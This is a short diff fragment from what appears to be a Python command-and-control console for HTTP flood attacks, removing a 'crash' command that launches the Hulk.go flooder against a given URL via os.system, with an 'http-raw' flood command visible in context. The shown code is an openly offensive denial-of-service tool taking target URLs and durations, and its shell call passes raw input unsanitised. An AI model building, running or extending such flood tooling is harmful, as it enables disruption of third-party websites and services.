@@ -473,15 +473,6 @@ def main():
                 print('Usage: http-raw <url> <time>')
                 print('Example: http-raw http://example.com 60')
 
-       elif "crash" in cnc:
-            try:
-                url = cnc.split()[1]
-                method = cnc.split()[2]
-                os.system(f'go run Hulk.go -site {url} -data {method}')
-            except IndexError:
-                print('Usage: crash <url> METHODS<GET/POST>')
-                print('Example: crash http://example.com GET')
-
         elif "http-rand" in cnc:
             try:
                 url = cnc.split()[1]
